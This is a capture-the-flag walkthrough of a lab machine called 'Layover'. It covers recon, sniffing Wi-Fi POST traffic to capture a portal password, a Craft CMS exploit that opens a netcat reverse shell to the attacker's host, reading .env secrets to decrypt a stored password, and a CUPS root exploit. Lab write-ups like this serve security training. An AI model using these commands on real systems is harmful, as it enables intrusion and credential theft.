# Layover


<img width="1589" height="281" alt="image" src="https://github.com/user-attachments/assets/8b9baa28-bf7b-4170-8a35-83536905d4d8" />

---


## Nmap Scan 

```ruby
└─$ nmap -sCV -Pn 10.129.140.165
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-26 19:59 UTC
Nmap scan report for 10.129.140.165
Host is up (0.40s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.29 seconds
                                                                          
```


----

> ## note in challange

<img width="1588" height="339" alt="image" src="https://github.com/user-attachments/assets/63f89b27-4878-4ee6-9a60-7c1049e02732" />



## Connect via RDP

```
rdesktop -u contractor -p 'Contractor2026!' 10.129.23.243
```

<img width="1858" height="854" alt="image" src="https://github.com/user-attachments/assets/2bf613c1-9901-46f4-984f-ecc4742cbdc5" />



```
id
sudo -l
sudo su -
```


<img width="837" height="377" alt="image" src="https://github.com/user-attachments/assets/385dd6ab-108d-41a6-9ae9-741db13be41d" />

> ## what ?!!! I get root ???
> it's fucken trap i can't find flags 


## i opend browser found :

```
http://wifi.international.htb/
```

<img width="1182" height="762" alt="image" src="https://github.com/user-attachments/assets/4e25a16d-1ee9-4920-bbf6-fcb58c25be78" />

> ## To connect to the portal you need to be connected to the airport wifi:

```
http://portal.international.htb/
```

<img width="1092" height="496" alt="image" src="https://github.com/user-attachments/assets/32f0ac53-16f8-4717-b109-5885ac0c4222" />

## now refresh page 

<img width="1179" height="818" alt="image" src="https://github.com/user-attachments/assets/b5f8bfe4-b873-4b01-9f1b-b5b6090f2ec5" />


## now network interface `wlan2` is connected to airport wifi 


```
ifconfig
```

<img width="1224" height="744" alt="image" src="https://github.com/user-attachments/assets/c7f6cbae-3e3f-4ef5-a90f-b08ecb02a145" />



## sniff traffic by make `wlan3` monitor to `wlan2`

```
ip addr show wlan2; ip route
getent hosts portal.international.htb wifi.international.htb


ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
tshark -i wlan3 -a duration:30 -Y 'wlan.fc.type==2' -T fields -e wlan.sa -e wlan.da 2>/dev/null | sort | uniq -c | sort -rn | head

iw dev wlan3 set type monitor 2>/dev/null; ip link set wlan3 up; iw dev wlan3 set channel 6
tshark -i wlan3 -a duration:120 -Y 'http.request.method=="POST"' -T fields -e ip.src -e http.request.full_uri -e urlencoded-form.key -e urlencoded-form.value 2>/dev/null
```

<img width="1022" height="118" alt="image" src="https://github.com/user-attachments/assets/2388fdfe-1a69-4d5c-90d7-6a9011236a35" />


```
jenny : Fl1ghtDeck2026!
```

> ## i tryed it in `http://portal.international.htb/miels` but it not work so i will fuzz 

i found 

```
302  /admin
404  /login
302  /logout
404  /dashboard
404  /api
404  /api/v1
404  /robots.txt
404  /sitemap.xml
200  /index.html
404  /portal

```

## i checked `/admin` and i found login page 

<img width="1510" height="791" alt="image" src="https://github.com/user-attachments/assets/43b74870-aeb1-46b7-aa37-c8cb16fb7221" />


## i try to login and it work 

<img width="1287" height="775" alt="image" src="https://github.com/user-attachments/assets/201c53ab-146a-4c54-93af-877c8b08a4b2" />

> ### notice `Craft cms version solo 5.9.8` i searched for CVES for this version 

## found [CVE-2026-28695](https://github.com/predyy/CVE-2026-28695)


```
python3 exp.py -t http://portal.international.htb -u jenny -p 'Fl1ghtDeck2026!' -c 'busybox nc 10.13.37.182 4444 -e /bin/sh'
```

<img width="965" height="102" alt="image" src="https://github.com/user-attachments/assets/669afa77-91ad-4dfc-a358-d598a95d37b6" />

### bingo 🫣🚩

<img width="1115" height="334" alt="image" src="https://github.com/user-attachments/assets/78a1ee6a-2bbb-42d3-a0da-ef2fb827fc53" />

## in `/portal` found 

```
drwxr-xr-x  8   197108   197121   4096 Sep  9 16:17 .
drwxr-xr-x  4   197108   197121   4096 Sep 23 13:14 ..
-rw-r--r--  1 www-data www-data    753 Aug 10 18:37 .env
-rw-r--r--  1 www-data www-data    411 May 13 23:11 .env.example.dev
-rw-r--r--  1 www-data www-data    623 May 13 23:11 .env.example.production
-rw-r--r--  1 www-data www-data    619 May 13 23:11 .env.example.staging
-rw-r--r--  1 www-data www-data     31 May 13 23:11 .gitignore
-rw-r--r--  1 www-data www-data    553 May 13 23:11 bootstrap.php
-rw-r--r--  1 www-data www-data    630 Aug 11 13:29 composer.json
-rw-r--r--  1 www-data www-data 314414 Jul 15 21:17 composer.lock
drwxr-xr-x  4   197108   197121   4096 Aug 11 13:29 config
-rwxr-xr-x  1 www-data www-data    309 May 13 23:11 craft
drwxr-xr-x  3 www-data www-data   4096 Aug 11 13:29 modules

```

## i found credentials  in `.env` for DB and secrity key 


<img width="997" height="369" alt="image" src="https://github.com/user-attachments/assets/f7f8d234-7407-40c1-b5dc-63da553e503a" />

```
# General settings
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DEV_MODE=false
CRAFT_ALLOW_ADMIN_CHANGES=false
CRAFT_DISALLOW_ROBOTS=true

CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftDB_pw_2026
CRAFT_DB_TABLE_PREFIX=

```

## connect to DB 

```
mysql -u craftuser -pCraftDB_pw_2026 craft
SELECT * FROM htbairways_settings;
```


<img width="1106" height="400" alt="image" src="https://github.com/user-attachments/assets/7a03d87f-196a-4775-a9b2-48e5f88e1027" />


## we will use `CRAFT_SECURITY_KEY` that we found and `vendor/autoload.php` to decrypt it

```
cd /var/www/portal
php -r "
require 'vendor/autoload.php';
\$security = new \yii\base\Security();
echo \$security->decryptByKey(
    base64_decode('u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w='),
    'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr'
);
"
```


<img width="1018" height="306" alt="image" src="https://github.com/user-attachments/assets/4a334cb0-6a74-4f72-b7fb-8fca8fc82137" />



## now we have the password of user `aporter`


```
ssh aporter@10.13.37.10
```

<img width="1113" height="358" alt="image" src="https://github.com/user-attachments/assets/9d59140c-e468-411a-a973-b8adebc562fc" />


## find services 

```
ss -tlnp
```

<img width="1094" height="263" alt="image" src="https://github.com/user-attachments/assets/739d1b65-a7cd-467a-849f-d7fd0bca4c9a" />


> ## Port 631 is used for the Internet Printing Protocol (IPP), which allows computers and devices to send print jobs, check printer status, and manage queues over a network.

<img width="1498" height="644" alt="image" src="https://github.com/user-attachments/assets/e6d42220-d69f-4cad-887b-e17fafca1911" />



## find cups version

```
cups-config --version 2>/dev/null
```

<img width="693" height="77" alt="image" src="https://github.com/user-attachments/assets/3d729d1a-9c44-4ff1-83f8-0a9b45fd898e" />


## search for CVES 

<img width="1809" height="657" alt="image" src="https://github.com/user-attachments/assets/9fdf6245-4742-44e7-bd12-137a861597b8" />


# [CVE-2026-34990](https://github.com/predyy/CVE-2026-34990)

```
python3 poc.py
sudo -i
```

<img width="1142" height="259" alt="image" src="https://github.com/user-attachments/assets/6201f1fc-4c45-4524-8e42-0af4e4ea5204" />





